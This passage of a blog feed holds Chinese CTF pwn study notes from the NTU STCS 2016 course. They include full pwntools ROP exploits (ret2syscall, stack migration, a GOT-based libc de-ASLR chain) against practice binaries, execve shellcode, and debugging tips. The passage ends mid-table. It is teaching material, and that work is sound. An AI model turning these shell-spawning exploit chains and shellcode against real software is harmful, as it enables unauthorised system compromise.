href="/uploads/codes/w5/libc.so.6">libc.so.6</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./gets&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;127.0.0.1&#x27;, 4000)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;10.21.13.69&#x27;</span>, <span class="number">10010</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./gets&#x27;</span>)</span><br><span class="line">g = <span class="keyword">lambda</span> x: <span class="built_in">next</span>(elf.search(asm(x)))</span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">gets_offset = libc.symbols[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">offset = system_offset - gets_offset</span><br><span class="line"><span class="keyword">if</span> offset &lt; <span class="number">0</span>:</span><br><span class="line">offset &amp;= <span class="number">0xffffffff</span></span><br><span class="line">gets_plt = elf.plt[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">gets_got = elf.got[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">libc_csu_init = elf.symbols[<span class="string">&#x27;__libc_csu_init&#x27;</span>]</span><br><span class="line">pop_rsp_r13_r14_r15_ret = g(<span class="string">&#x27;pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret&#x27;</span>)</span><br><span class="line">pop_rbp_ret = g(<span class="string">&#x27;pop rbp ; ret&#x27;</span>)</span><br><span class="line">pop_rdi_ret = g(<span class="string">&#x27;pop rdi ; ret&#x27;</span>)</span><br><span class="line">pop_r15_ret = g(<span class="string">&#x27;pop r15 ; ret&#x27;</span>)</span><br><span class="line">pop_rsi_r15_ret = g(<span class="string">&#x27;pop rsi ; pop r15 ; ret&#x27;</span>)</span><br><span class="line">pop_rbp_r14_r15_ret = g(<span class="string">&#x27;pop rbp ; pop r14 ; pop r15 ; ret&#x27;</span>)</span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15_ret = g(<span class="string">&#x27;pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret&#x27;</span>)</span><br><span class="line">add_ebx_esi_ret = g(<span class="string">&#x27;add ebx, esi ; ret&#x27;</span>)</span><br><span class="line">leave_ret = g(<span class="string">&#x27;leave ; ret&#x27;</span>)</span><br><span class="line">call_at_r12 = g(<span class="string">&#x27;call QWORD PTR [r12+rbx*8]&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x602000</span></span><br><span class="line">buf1 = bss - <span class="number">0x100</span></span><br><span class="line">buf2 = bss - <span class="number">0x200</span></span><br><span class="line">buf3 = bss - <span class="number">0x300</span></span><br><span class="line">buf4 = bss - <span class="number">0x400</span></span><br><span class="line">buf5 = bss - <span class="number">0x500</span></span><br><span class="line">buf6 = bss - <span class="number">0x600</span></span><br><span class="line">buf7 = bss - <span class="number">0x700</span></span><br><span class="line">buf8 = bss - <span class="number">0x800</span></span><br><span class="line"></span><br><span class="line">rop1 = [</span><br><span class="line">pop_rdi_ret, buf1, gets_plt, <span class="comment"># rop2</span></span><br><span class="line">pop_rdi_ret, buf2, gets_plt, <span class="comment"># rop4</span></span><br><span class="line">pop_rdi_ret, buf3, gets_plt, <span class="comment"># rop5</span></span><br><span class="line">pop_rdi_ret, buf4, gets_plt, <span class="comment"># rop7</span></span><br><span class="line">pop_rdi_ret, buf5, gets_plt, <span class="comment"># rop9</span></span><br><span class="line">pop_rdi_ret, buf6, gets_plt, <span class="comment"># rop10</span></span><br><span class="line">pop_rdi_ret, buf7, gets_plt, <span class="comment"># rop13</span></span><br><span class="line">pop_rbp_ret, buf1 - <span class="number">8</span>, leave_ret</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rop2 = [ <span class="comment"># buf1</span></span><br><span class="line">pop_rdi_ret, gets_got + <span class="number">24</span>, gets_plt, <span class="comment"># rop3</span></span><br><span class="line">pop_rbp_ret, buf2 - <span class="number">8</span>,</span><br><span class="line">pop_rsp_r13_r14_r15_ret, gets_got</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rop3 = [ <span class="comment"># gets_got + 24</span></span><br><span class="line">leave_ret</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rop4 = [ <span class="comment"># buf2</span></span><br><span class="line">libc_csu_init,</span><br><span class="line">pop_rbp_ret, buf3 - <span class="number">8</span>, leave_ret</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rop5 = [ <span class="comment"># buf3</span></span><br><span class="line">pop_rdi_ret, buf2 - <span class="number">24</span>, gets_plt, <span class="comment"># rop6_1</span></span><br><span class="line">pop_rdi_ret, buf2 + <span class="number">32</span>, gets_plt, <span class="comment"># rop6_2</span></span><br><span class="line">pop_rbp_ret, buf2 - <span class="number">24</span> - <span class="number">8</span>, leave_ret</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rop6_1 = [ <span class="comment"># buf2 - 24</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15_ret</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rop6_2 = [ <span class="comment"># buf2 + 32</span></span><br><span class="line">pop_rsi_r15_ret, offset, <span class="number">8</span>,</span><br><span class="line">add_ebx_esi_ret,</span><br><span class="line"><span class="comment">#0xdeadbeef,</span></span><br><span class="line">libc_csu_init,</span><br><span class="line">pop_rbp_ret, buf4 - <span class="number">8</span>, leave_ret</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rop7 = [ <span class="comment"># buf4</span></span><br><span class="line">pop_rdi_ret, gets_got + <span class="number">28</span>, gets_plt, <span class="comment"># rop8</span></span><br><span class="line">pop_rbp_ret, buf5 - <span class="number">8</span>,</span><br><span class="line">pop_rsp_r13_r14_r15_ret, gets_got + <span class="number">4</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rop8 = [ <span class="comment"># gets_got + 28</span></span><br><span class="line">leave_ret</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rop9 = [ <span class="comment"># buf5</span></span><br><span class="line">libc_csu_init,</span><br><span class="line">pop_rbp_ret, buf6 - <span class="number">8</span>, leave_ret</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rop10 = [ <span class="comment"># buf6</span></span><br><span class="line">pop_rdi_ret, buf5 - <span class="number">24</span>, gets_plt, <span class="comment"># rop11_1</span></span><br><span class="line">pop_rdi_ret, buf5 + <span class="number">32</span>, gets_plt, <span class="comment"># rop11_2</span></span><br><span class="line">pop_rbp_ret, buf5 - <span class="number">24</span> - <span class="number">8</span>, leave_ret</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rop11_1 = [ <span class="comment"># buf5 - 24</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15_ret</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rop11_2 = [ <span class="comment"># buf5 + 32</span></span><br><span class="line">pop_rdi_ret, buf2 + <span class="number">68</span>, gets_plt, <span class="comment"># rop12</span></span><br><span class="line">pop_rbp_ret, buf2 + <span class="number">68</span> - <span class="number">8</span>, leave_ret</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rop12 = [ <span class="comment"># buf2 + 164</span></span><br><span class="line">libc_csu_init,</span><br><span class="line">pop_rbp_ret, buf7 - <span class="number">8</span>, leave_ret</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rop13 = [</span><br><span class="line">pop_rdi_ret, buf8, gets_plt, <span class="comment"># shell command</span></span><br><span class="line">pop_rdi_ret, buf8,</span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15_ret, <span class="number">0</span>, <span class="number">0</span>, buf2 + <span class="number">24</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">call_at_r12</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">payload = (</span><br><span class="line"><span class="string">&#x27;A&#x27;</span> * <span class="number">24</span> +</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(p64, rop1)) + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(p64, rop2)) + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(p64, rop4)) + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(p64, rop5)) + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(p64, rop7)) + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(p64, rop9)) + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(p64, rop10)) + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(p64, rop13)) + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(p64, rop3))[:-<span class="number">1</span>] + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(p64, rop6_1))[:-<span class="number">1</span>] + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(p64, rop6_2)) + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(p64, rop8)) + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(p64, rop11_1))[:-<span class="number">1</span>] + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(p64, rop11_2)) + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(p64, rop12)) + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line"><span class="string">&#x27;sh\n&#x27;</span></span><br><span class="line">)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="w5-x64-deaslr-process.png" alt="w5-x64-deaslr-process"></p><p><img src="w5-getv-from-got.png" alt="w5-getv-from-got"></p><p><img src="w5-x64-deaslr-addoffset.png" alt="w5-x64-deaslr-addoffset"></p><p><img src="w5-deaslr-base2rbx.png" alt="w5-deaslr-base2rbx"></p>]]></content>
      
      
      <categories>
          
          <category> NTU STCS 2016学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NTU STCS 2016学习笔记 0x02 ROP</title>
      <link href="/2020/08/25/ntu-stcs-2016-w4/"/>
      <url>/2020/08/25/ntu-stcs-2016-w4/</url>
      
        <content type="html"><![CDATA[<h1 id="gdbserver"><a href="#gdbserver" class="headerlink" title="gdbserver"></a>gdbserver</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># in bash commandline</span></span><br><span class="line">gdbserver 127.0.0.1:4000 ./binary <span class="comment">#break在entrypoint</span></span><br><span class="line"><span class="comment"># in gdb commandline</span></span><br><span class="line">gdb ./binary</span><br><span class="line">$ target remote 127.0.0.1:4000</span><br><span class="line">$ <span class="built_in">continue</span></span><br><span class="line"><span class="comment"># 搭配ncat</span></span><br><span class="line">ncat -vc <span class="string">&#x27;gdbserver 127.0.0.1:4000 .binary&#x27;</span> -kl 127.0.0.1 5000</span><br></pre></td></tr></table></figure><p><strong>trick</strong></p><p>使用gdbscript attach pid</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># .gdbinit</span></span><br><span class="line"><span class="built_in">set</span> disassembly-flavor intel</span><br><span class="line">define at</span><br><span class="line">  shell <span class="built_in">echo</span> attach $(pidof -s <span class="variable">$arg0</span>) &gt; /tmp/foo.gdb</span><br><span class="line">  <span class="built_in">source</span> /tmp/foo.gdb</span><br><span class="line">end</span><br></pre></td></tr></table></figure><hr><h1 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h1><p>类型包括:ret2syscall ret2text ret2libc</p><h2 id="rop2syscall"><a href="#rop2syscall" class="headerlink" title="rop2syscall"></a>rop2syscall</h2><ul><li>  找gadget控制syscall需要的regs(eax,ebx,ecx,edx)</li><li>  需要int 80</li></ul><p><strong>RopGadget</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#usage</span></span><br><span class="line">RopGadget --binary ./binary</span><br><span class="line"><span class="comment">#int 80 ; ret</span></span><br><span class="line">RopGadget --binary ./binary --opcode cd80c3</span><br></pre></td></tr></table></figure><blockquote><p>PS:execve需要’/bin/sh’，且地址必须已知<br>用read吧需要的字符串输入至已知地址的buffer上</p></blockquote><p>找可写page用于read(0,buf_addr,len)中的buf_addr<br>一般用bss最后一页即可</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/`pidof binary`/maps</span><br><span class="line">readelf -a binary | less <span class="comment"># 看Section Headers中的.bss</span></span><br></pre></td></tr></table></figure><p>eg.</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./p1&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./p1&#x27;</span>)</span><br><span class="line">g = <span class="keyword">lambda</span> x: <span class="built_in">next</span>(elf.search(asm(x)))</span><br><span class="line">pop_eax_ret = g(<span class="string">&#x27;pop eax ; ret&#x27;</span>) <span class="comment"># 0x080b8126</span></span><br><span class="line">pop_ebx_ret = g(<span class="string">&#x27;pop ebx ; ret&#x27;</span>) <span class="comment"># 0x080481c9</span></span><br><span class="line">pop_ecx_ret = g(<span class="string">&#x27;pop ecx ; ret&#x27;</span>) <span class="comment"># 0x080de849</span></span><br><span class="line">pop_edx_ret = g(<span class="string">&#x27;pop edx ; ret&#x27;</span>) <span class="comment"># 0x0806edca</span></span><br><span class="line">int_0x80_ret = g(<span class="string">&#x27;int 0x80 ; ret&#x27;</span>)</span><br><span class="line">buf = <span class="number">0x080eb000</span> - <span class="number">100</span></span><br><span class="line">raw_input(<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line">offset = <span class="number">62</span></span><br><span class="line"><span class="comment"># read(0, &#x27;/bin/sh\x00&#x27;, 100)</span></span><br><span class="line">rop1 = [</span><br><span class="line">pop_eax_ret,</span><br><span class="line"><span class="number">3</span>,</span><br><span class="line">pop_ebx_ret,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">pop_ecx_ret,</span><br><span class="line">buf,</span><br><span class="line">pop_edx_ret,</span><br><span class="line"><span class="number">100</span>,</span><br><span class="line">int_0x80_ret,</span><br><span class="line">]</span><br><span class="line"><span class="comment"># execve(&#x27;/bin/sh\x00&#x27;, 0, 0)</span></span><br><span class="line">rop2 = [</span><br><span class="line">pop_eax_ret,</span><br><span class="line"><span class="number">0xb</span>,</span><br><span class="line">pop_ebx_ret,</span><br><span class="line">buf,</span><br><span class="line">pop_ecx_ret,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">pop_edx_ret,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">int_0x80_ret</span><br><span class="line">]</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * offset + <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(p32, rop1)) + <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(p32, rop2))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="使用较长的gadget"><a href="#使用较长的gadget" class="headerlink" title="使用较长的gadget"></a>使用较长的gadget</h3><p><img src="https://raw.githubusercontent.com/DojoKuro/blog_img/main/202306051734773.png" alt="long gadget"></p><p><strong>leave指令</strong></p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">#<span class="keyword">leave</span></span><br><span class="line"><span class="keyword">mov</span>   <span class="built_in">esp</span>, <span class="built_in">ebp</span></span><br><span class="line"><span class="keyword">pop</span>   <span class="built_in">ebp</span></span><br></pre></td></tr></table></figure><p><strong>Trick: Stack Migration</strong></p><ul><li>  使用leave把栈放到已知位置</li><li>  确定rop chain的位置时可以直接附加其他data</li><li>  可以无限rop</li><li>  migrate后的空间要足够</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gadget1 = <span class="number">0x8048898</span></span><br><span class="line"><span class="comment"># gadget1 has gets() and leave_ret</span></span><br><span class="line"><span class="comment"># 8048898:       50                      push   eax</span></span><br><span class="line"><span class="comment"># 8048899:       e8 e2 69 00 00          call   804f280 &lt;_IO_gets&gt;</span></span><br><span class="line"><span class="comment"># 804889e:       83 c4 10                add    esp,0x10</span></span><br><span class="line"><span class="comment"># 80488a1:       90                      nop</span></span><br><span class="line"><span class="comment"># 80488a2:       c9                      leave</span></span><br><span class="line"><span class="comment"># 80488a3:       c3                      ret</span></span><br><span class="line">migration = [</span><br><span class="line">    pop_ebp_ret,</span><br><span class="line">    buf - <span class="number">4</span>,  <span class="comment">#leave会pop ebp，所以要控制到buf-4位置</span></span><br><span class="line">    pop_eax_ret,</span><br><span class="line">    buf,</span><br><span class="line">    gadget1,</span><br><span class="line">]</span><br><span class="line">rop = [</span><br><span class="line">    pop_eax_ret,</span><br><span class="line">    <span class="number">0xb</span>,</span><br><span class="line">    pop_ebx_ret,</span><br><span class="line">    buf + <span class="number">9</span> * <span class="number">4</span>,  <span class="comment">#ropchain一共有9*4bytes</span></span><br><span class="line">    pop_ecx_ret,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    pop_edx_ret,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    int_0x80_ret</span><br><span class="line">]</span><br><span class="line">payload1 = <span class="string">&#x27;A&#x27;</span> * offset + <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(p32, migration))</span><br><span class="line">payload2 = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(p32, rop)) + <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> NTU STCS 2016学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NTU STCS 2016学习笔记 0x01 Intro</title>
      <link href="/2020/08/23/ntu-stcs-2016-w3/"/>
      <url>/2020/08/23/ntu-stcs-2016-w3/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h2 id="objdump"><a href="#objdump" class="headerlink" title="objdump"></a>objdump</h2><p>常用指令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ objdump -T binary</span><br><span class="line">$ <span class="built_in">cat</span> /proc/`pidof binary`/maps</span><br></pre></td></tr></table></figure><h2 id="readelf"><a href="#readelf" class="headerlink" title="readelf"></a>readelf</h2><p>分析elf binary header里的一些信息<br>readelf -a | grep STACK 看能否跑shellcode</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ readelf -a ./binary | grep STACK</span><br><span class="line">  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10</span><br></pre></td></tr></table></figure><p><strong>trick</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ readelf -a ./binary | grep <span class="string">&#x27; system@&#x27;</span></span><br><span class="line">$ ldd binary</span><br></pre></td></tr></table></figure><p><strong>trick:execstack</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ execstack --h</span><br><span class="line">Usage: execstack [OPTION...]</span><br><span class="line">execstack -- program to query or <span class="built_in">set</span> executable stack flag</span><br><span class="line"></span><br><span class="line">  -c, --clear-execstack      Clear executable stack flag bit</span><br><span class="line">  -q, --query                Query executable stack flag bit</span><br><span class="line">  -s, --set-execstack        Set executable stack flag bit</span><br><span class="line">  -?, --<span class="built_in">help</span>                 Give this <span class="built_in">help</span> list</span><br><span class="line">      --usage                Give a short usage message</span><br><span class="line">  -V, --version              Print program version</span><br><span class="line">Report bugs to &lt;jakub@redhat.com&gt;.</span><br></pre></td></tr></table></figure><hr><h2 id="ncat"><a href="#ncat" class="headerlink" title="ncat"></a>ncat</h2><p>建立local service环境，因为你不会再无法debug的情况下直接对remote做事<br>ncat -vc ./binary -kl 127.0.0.1 8888<br>ncat -vc ‘strace -e trace=read ./binary’ -kl ::1 4000</p><hr><h2 id="GNU-GDB"><a href="#GNU-GDB" class="headerlink" title="GNU GDB"></a>GNU GDB</h2><p>layout asm<br>attach [pid]</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> 0 | sudo <span class="built_in">tee</span> /proc/sys/kernel/yama/ptrace_scope</span><br></pre></td></tr></table></figure><p>b,c,si,ni,fin<br>x/3wx,x/7i,x/bx,x/s,p</p><hr><h2 id="技巧-Hook-amp-Patch"><a href="#技巧-Hook-amp-Patch" class="headerlink" title="技巧 Hook&amp;Patch"></a>技巧 Hook&amp;Patch</h2><p>当binary文件有alarm时关掉alarm</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sed -i s/alarm/isnan/g ./binary</span><br><span class="line">$ vim ./binary</span><br><span class="line">:%s/alarm/isnan/g <span class="comment">#使用isnan函数替换alarm</span></span><br><span class="line">$ ltrace ./binary</span><br><span class="line">__libc_start_main(0x8048480, 1, 0xfffa3ba4, 0x80484c0 &lt;unfinished ...&gt;</span><br><span class="line">isnan(60, 0xffa2ed14, 0xffa2ed1c, 0xf75b2c8b)                   = 0</span><br></pre></td></tr></table></figure><p>hook alarm by LD_PRELOAD</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// hook.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">alarm</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> seconds)</span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, seconds);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gcc hook.c -o hook.so -shared -fPIC -m32</span><br><span class="line">$ LD_PRELOAD=./hook.so ./binary</span><br></pre></td></tr></table></figure><p>LD_SHOW_AUXV</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ncat -vc <span class="string">&#x27;LD_SHOW_AUXV=1 ./level2&#x27;</span> -kl 127.0.0.1 6666</span><br><span class="line">Ncat: Version 7.80 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on 127.0.0.1:6666</span><br><span class="line">Ncat: Connection from 127.0.0.1.</span><br><span class="line">Ncat: Connection from 127.0.0.1:36108</span><br><span class="line"></span><br><span class="line">$ nc 127.0.0.1 6666</span><br><span class="line">AT_SYSINFO:           0xf7f7ab40</span><br><span class="line">AT_SYSINFO_EHDR:      0xf7f7a000</span><br><span class="line">...</span><br><span class="line">AT_PAGESZ:            4096</span><br><span class="line">AT_CLKTCK:            100</span><br><span class="line">AT_PHDR:              0x8048034</span><br><span class="line">AT_PHENT:             32</span><br><span class="line">AT_PHNUM:             9</span><br><span class="line">AT_BASE:              0xf7f7b000 <span class="comment">#librarybase</span></span><br><span class="line">AT_FLAGS:             0x0</span><br><span class="line">AT_ENTRY:             0x8048350</span><br><span class="line">...</span><br><span class="line">AT_SECURE:            0</span><br><span class="line">AT_RANDOM:            0xffd88bcb <span class="comment">#stackout canary</span></span><br><span class="line">AT_HWCAP2:            0x0</span><br><span class="line">...</span><br><span class="line">AT_EXECFN:            /bin/sh</span><br><span class="line">AT_PLATFORM:          x86_64</span><br><span class="line">Input:</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="qira"><a href="#qira" class="headerlink" title="qira"></a><a href="https://qira.me/">qira</a></h2><p>非常好用的gdb动态调试工具，部署略</p><blockquote><p>Ubuntu 14.04 and 16.04 supported out of the box.<br>18.04 is having a problem with building QEMU<br>See forked QEMU source at <a href="https://github.com/geohot/qemu/tree/qira">https://github.com/geohot/qemu/tree/qira</a> to fix.</p></blockquote><p><a href="https://github.com/geohot/qira">使用方法</a></p><p>开启指令 python qira.py -s ./binary</p><hr><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure><p><a href="http://docs.pwntools.com/en/stable/">Documentation</a></p><h2 id="nasm"><a href="#nasm" class="headerlink" title="nasm"></a>nasm</h2><p>X86编译工具，编译shellcode使用</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nasm -felf32 test.asm -o test.o</span><br><span class="line">ld -melf_i386 test.o -o <span class="built_in">test</span></span><br><span class="line">objcopy -O binary test.o test.bin</span><br><span class="line">objdump -b binary -m i386 -D test.bin</span><br></pre></td></tr></table></figure><p>e.g</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">[<span class="meta">section</span> .data]</span><br><span class="line"><span class="meta">global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="keyword">jmp</span> sh</span><br><span class="line"><span class="symbol">se:</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ebx</span></span><br><span class="line"><span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">11</span></span><br><span class="line"><span class="keyword">xor</span> <span class="built_in">ecx</span>, <span class="built_in">ecx</span></span><br><span class="line"><span class="keyword">xor</span> <span class="built_in">edx</span>, <span class="built_in">edx</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">0x80</span></span><br><span class="line"><span class="symbol">sh:</span></span><br><span class="line"><span class="keyword">call</span> se</span><br><span class="line"><span class="built_in">db</span> <span class="string">&#x27;/bin/sh&#x27;</span>, <span class="number">0</span></span><br></pre></td></tr></table></figure><p><strong>注：使用mov eax, 0赋值时可能会出错</strong></p><p>错误代码：</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">se:</span></span><br><span class="line">  <span class="keyword">pop</span> <span class="built_in">ebx</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">11</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">ecx</span>, <span class="built_in">ecx</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">edx</span>, <span class="built_in">edx</span></span><br><span class="line">  <span class="keyword">int</span> <span class="number">0x80</span></span><br></pre></td></tr></table></figure><p>用作payload时会产生0x00字符遇到read()的情况会被截断</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ xxd test.bin</span><br><span class="line">00000000: eb0c 5bb8 0b00 0000 89c9 89d2 cd80 e8ef  ..[.............</span><br><span class="line">00000010: ffff ff2f 6269 6e2f 7368 00              .../bin/sh.</span><br></pre></td></tr></table></figure><p><strong><a href="http://shell-storm.org/shellcode/files/syscalls.html">Linux System Call Table</a></strong></p><hr><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><ul><li>  不能有\0</li><li>  可以用call + pop的方式拿到shellcode address</li><li>  长度不足时，如果还能输入可以make read函数</li></ul><h2 id="alphanumeric-Shellcode"><a href="#alphanumeric-Shellcode" class="headerlink" title="alphanumeric Shellcode"></a>alphanumeric Shellcode</h2><blockquote><p>只能用0-9写shellcode</p></blockquote><p>int 0x80 = \xcd\x80，如何用数字做sys_call？</p><p><strong>自修改</strong></p><p>| decoder1 | encoded decoder2 | encoded shellcode |</p><pre><code>a   61                      popa   b   62 41 42                bound  eax, QWORD PTR [ecx+0x42]c   63 41 42                arpl   WORD PTR [ecx+0x42], axd   64 41                   fs inc ecxe   65 41                   gs inc ecxf   66 41                   inc    cxg   67 41                   addr16 inc ecxh   68 41 42 43 44          push   0x44434241i   69 41 42 43 44 45 46    imul   eax, DWORD PTR [ecx+0x42], 0x46454443j   6a 41                   push   0x41k   6b 41 42 43             imul   eax, DWORD PTR [ecx+0x42], 0x43l   6c                      ins    BYTE PTR es:[edi], dxm   6d                      ins    DWORD PTR es:[edi], dxn   6e                      outs   dx, BYTE PTR ds:[esi]o   6f                      outs   dx, 